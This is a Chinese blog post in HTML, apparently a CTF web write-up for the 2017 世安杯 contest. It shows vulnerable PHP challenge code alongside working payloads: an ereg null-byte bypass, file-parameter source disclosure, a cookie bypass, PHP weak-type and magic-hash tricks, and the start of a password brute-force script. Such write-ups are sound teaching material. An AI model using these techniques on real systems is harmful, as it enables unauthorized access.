@@ -1,0 +1,924 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF,writeup," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="iSky0t's Notes" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/uploads/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="今天和几个大校的同学玩了下世安杯，然后遇到网站一直502也是挺醉的，下面是web部分的wp，自己写了下">
+<meta name="keywords" content="CTF,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="世安杯web-writeup">
+<meta property="og:url" content="https://isky0t.github.io/2017/10/08/世安杯web-writeup/index.html">
+<meta property="og:site_name" content="iSky0t&#39;s Notes">
+<meta property="og:description" content="今天和几个大校的同学玩了下世安杯，然后遇到网站一直502也是挺醉的，下面是web部分的wp，自己写了下">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://isky0t.github.io/images/shianbei01.png">
+<meta property="og:updated_time" content="2017-10-08T12:09:23.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="世安杯web-writeup">
+<meta name="twitter:description" content="今天和几个大校的同学玩了下世安杯，然后遇到网站一直502也是挺醉的，下面是web部分的wp，自己写了下">
+<meta name="twitter:image" content="https://isky0t.github.io/images/shianbei01.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://isky0t.github.io/2017/10/08/世安杯web-writeup/"/>
+
+
+
+
+
+  <title>世安杯web-writeup | iSky0t's Notes</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">iSky0t's Notes</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://isky0t.github.io/2017/10/08/世安杯web-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="iSky0t">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="iSky0t's Notes">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">世安杯web-writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-08T15:17:39+08:00">
+                2017-10-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeup-web/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup-web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/10/08/世安杯web-writeup/" class="leancloud_visitors" data-flag-title="世安杯web-writeup">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>今天和几个大校的同学玩了下世安杯，然后遇到网站一直502也是挺醉的，下面是web部分的wp，自己写了下<br><a id="more"></a></p>
+<h2 id="ctf入门级题目"><a href="#ctf入门级题目" class="headerlink" title="ctf入门级题目"></a>ctf入门级题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$flag = <span class="string">'*********'</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p class="alert"&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</div><div class="line">        <span class="keyword">die</span>($flag);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p class="alert"&gt;Invalid password&lt;/p&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line">&lt;section class="login"&gt;</div><div class="line">        &lt;div class="title"&gt;</div><div class="line">                &lt;a href=<span class="string">"./index.phps"</span>&gt;View Source&lt;/a&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line"></div><div class="line">        &lt;form method=<span class="string">"POST"</span>&gt;</div><div class="line">                &lt;input type=<span class="string">"text"</span> required name=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span> /&gt;&lt;br/&gt;</div><div class="line">                &lt;input type=<span class="string">"submit"</span>/&gt;</div><div class="line">        &lt;/form&gt;</div><div class="line">&lt;/section&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<p>给出了源码，诶？怎么似曾相识，应该是利用<code>ereg</code>遇到<code>%00</code>截断的方法，于是提交payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?password=test%00--</div></pre></td></tr></table></figure></p>
+<p>注意<code>%</code>不要被URL编码，得到flag</p>
+<h2 id="曲奇饼"><a href="#曲奇饼" class="headerlink" title="曲奇饼"></a>曲奇饼</h2><p>一看到这个URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?line=&amp;file=a2V5LnR4dA==</div></pre></td></tr></table></figure></p>
+<p>file应该是读取文件的文件名经过base64加密，解密下为key.txt，印证猜想，那就直接读取<code>index.php</code>把，加密后访问什么都没有，又注意到<code>line</code>参数，应该是行数吧？测试下的确是，于是写个脚本down下源代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">@author: iSky0t</span></div><div class="line"><span class="string">@contact: isky0toor@gmail.com</span></div><div class="line"><span class="string">@time: 2017/10/8 10:20</span></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</div><div class="line">        url = <span class="string">"http://ctf1.shiyanbar.com/shian-quqi/index.php?line="</span>+str(i)+<span class="string">"&amp;file=aW5kZXgucGhw"</span></div><div class="line">        req = urllib2.Request(url)</div><div class="line">        f = urllib2.urlopen(req)</div><div class="line">        <span class="keyword">print</span> f.read()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line"></div><div class="line"></div><div class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])?$_GET[<span class="string">'file'</span>]:<span class="string">""</span>);</div><div class="line"></div><div class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;file=a2V5LnR4dA=="</span>);</div><div class="line"></div><div class="line">$file_list = <span class="keyword">array</span>(</div><div class="line"></div><div class="line"><span class="string">'0'</span> =&gt;<span class="string">'key.txt'</span>,</div><div class="line"></div><div class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</div><div class="line"></div><div class="line">);</div><div class="line"></div><div class="line"> </div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'key'</span>]) &amp;&amp; $_COOKIE[<span class="string">'key'</span>]==<span class="string">'li_lr_480'</span>)&#123;</div><div class="line"></div><div class="line">$file_list[<span class="number">2</span>]=<span class="string">'thisis_flag.php'</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"> </div><div class="line"></div><div class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</div><div class="line"></div><div class="line">$fa = file($file);</div><div class="line"></div><div class="line"><span class="keyword">echo</span> $fa[$line];</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>看了下源代码后在<code>cookie</code>中添加了li_lr_480，再拼接base64加密的文件名，访问得到flag</p>
+<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>这题卡了我好久，后来翻阅资料<a href="https://www.bertramc.cn/2017/03/25/20.html" target="_blank" rel="external">array_search</a>还去问了pcat表哥，结果表哥一步到位告诉了我方法和payload。。其本质还是函数的弱类型导致的绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">show_source(<span class="keyword">__FILE__</span>); </div><div class="line">$a=<span class="number">0</span>; </div><div class="line">$b=<span class="number">0</span>; </div><div class="line">$c=<span class="number">0</span>; </div><div class="line">$d=<span class="number">0</span>; </div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x1'</span>])) </div><div class="line">&#123; </div><div class="line">        $x1 = $_GET[<span class="string">'x1'</span>]; </div><div class="line">        $x1==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">        <span class="keyword">switch</span> ($x1) </div><div class="line">        &#123; </div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>: </div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>: </div><div class="line">                $a=<span class="number">1</span>; </div><div class="line">                <span class="keyword">break</span>; </div><div class="line">        &#125; </div><div class="line">&#125; </div><div class="line">$x2=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'x2'</span>]); </div><div class="line"><span class="keyword">if</span>(is_array($x2))&#123; </div><div class="line">    is_numeric(@$x2[<span class="string">"x21"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">    <span class="keyword">if</span>(@$x2[<span class="string">"x21"</span>])&#123; </div><div class="line">        ($x2[<span class="string">"x21"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>; </div><div class="line">    &#125; </div><div class="line">    <span class="keyword">if</span>(is_array(@$x2[<span class="string">"x22"</span>]))&#123; </div><div class="line">        <span class="keyword">if</span>(count($x2[<span class="string">"x22"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($x2[<span class="string">"x22"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>); </div><div class="line">        $p = array_search(<span class="string">"XIPU"</span>, $x2[<span class="string">"x22"</span>]); </div><div class="line">        $p===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">        <span class="keyword">foreach</span>($x2[<span class="string">"x22"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123; </div><div class="line">            $val===<span class="string">"XIPU"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">        &#125; </div><div class="line">        $c=<span class="number">1</span>; </div><div class="line">&#125; </div><div class="line">&#125; </div><div class="line">$x3 = $_GET[<span class="string">'x3'</span>]; </div><div class="line"><span class="keyword">if</span> ($x3 != <span class="string">'15562'</span>) &#123; </div><div class="line">    <span class="keyword">if</span> (strstr($x3, <span class="string">'XIPU'</span>)) &#123; </div><div class="line">        <span class="keyword">if</span> (substr(md5($x3),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123; </div><div class="line">            $d=<span class="number">1</span>; </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"><span class="keyword">if</span>($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d)&#123; </div><div class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>; </div><div class="line">    <span class="keyword">echo</span> $flag; </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>先来看看坑死我的这个函数</p>
+<h3 id="array-search"><a href="#array-search" class="headerlink" title="array_search"></a>array_search</h3><p>手册里介绍的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed array_search ( mixed $needle , <span class="keyword">array</span> $haystack [, bool $strict = <span class="keyword">false</span> ] )</div></pre></td></tr></table></figure></p>
+<p>两个参数必须，一个参数可选，也就是这个参数的问题。<br>该函数作用是在<code>$haystack</code>元素中寻找和<code>$needle</code>相同的元素，有则返回键名，无则返回<code>false</code>。</p>
+<ul>
+<li><code>$strict</code>默认为<code>false</code>时，不严格比较类型，会自动强制转换</li>
+<li><code>$strict</code>为<code>true</code>时，严格比较类型</li>
+</ul>
+<p>搭配一个例子说明<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">$array=<span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>);</div><div class="line">var_dump(array_search(<span class="string">'XIPU'</span>, $array)); </div><div class="line">var_dump(array_search(<span class="string">'1XIPU'</span>, $array)); </div><div class="line"><span class="meta">?&gt;</span></div><div class="line">-----------</div><div class="line">int(<span class="number">0</span>)</div><div class="line">int(<span class="number">1</span>)</div></pre></td></tr></table></figure></p>
+<p>于是这个搞定了，看下一个，pcat表哥直接给了我Python脚本，最后<code>$x3</code>主要是跑出一端md5值和15562中间那几位相等，那几位碰巧是<code>0e</code>打头，而又用的是<code>==</code>，所以</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">__author__=<span class="string">'pcat@chamd5.org'</span></div><div class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></div><div class="line">    s = <span class="string">'XIPU'</span></div><div class="line">    myre = <span class="string">'0e\d&#123;14&#125;'</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000</span>):</div><div class="line">        t = s + str(i)</div><div class="line">        x = md5(t).hexdigest()[<span class="number">8</span>:<span class="number">8</span> + <span class="number">16</span>]</div><div class="line">        <span class="keyword">if</span> re.match(myre, x) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">print</span> t</div><div class="line">            <span class="keyword">break</span></div><div class="line"></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span><span class="params">()</span>:</span></div><div class="line">    test()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure>
+<p>最后的payload自然出来了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?x1=0&amp;x2=&#123;&quot;x21&quot;:&quot;2018b&quot;,&quot;x22&quot;:[[&quot;XIPUx&quot;],0]&#125;&amp;x3=XIPU18570</div></pre></td></tr></table></figure>
+<h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><p>这题把我坑的更惨。虽然一点儿不难<br>右键查看网页源代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- 听说密码是一个五位数字 --&gt;</span></div></pre></td></tr></table></figure></p>
+<p>当时学弟提醒我直接爆破，我看完手上那个题目后，马上写了这个脚本着手爆破，但是爆破了几个小时（不会写多线程），爆破到了4w。后来忙完其他题目，再去看会不会是注入，但是根据猜测对username做的过滤就是只有admin才行。最后狗哥说就是爆破 而且密码是000325，我的心就碎了，我是从10000爆破到99999的。哇的一声哭出来~~~<br>附带狗哥的脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> codecs</div><div class="line">user_agent_list = [</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span></div><div class="line">        ]</div><div class="line"></div><div class="line">url = <span class="string">'http://ctf1.shiyanbar.com/shian-s/'</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">logfile</span><span class="params">(log, logfile)</span>:</span></div><div class="line">    f = codecs.open(logfile, <span class="string">'a'</span>,<span class="string">'utf-8'</span>)</div><div class="line">    f.write(log + <span class="string">"\n"</span>)</div><div class="line">    f.close</div><div class="line">cookies = &#123;<span class="string">"PHPSESSID"</span>:<span class="string">"ttp2qsi06ksmf4t4h1pclk5uh1"</span>,<span class="string">"Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3"</span>:<span class="string">"1507184117"</span>,<span class="string">"Hm_cv_34d6f7353ab0915a4c582e4516dffbc3"</span>:<span class="string">"1*visitor*%E6%B8%B8%E5%AE%A2"</span>&#125;</div><div class="line"><span class="comment">#如果要上交wp请换成自己的cookie</span></div><div class="line"></div><div class="line">passwd = [i.replace(<span class="string">"\n"</span>, <span class="string">""</span>) <span class="keyword">for</span> i 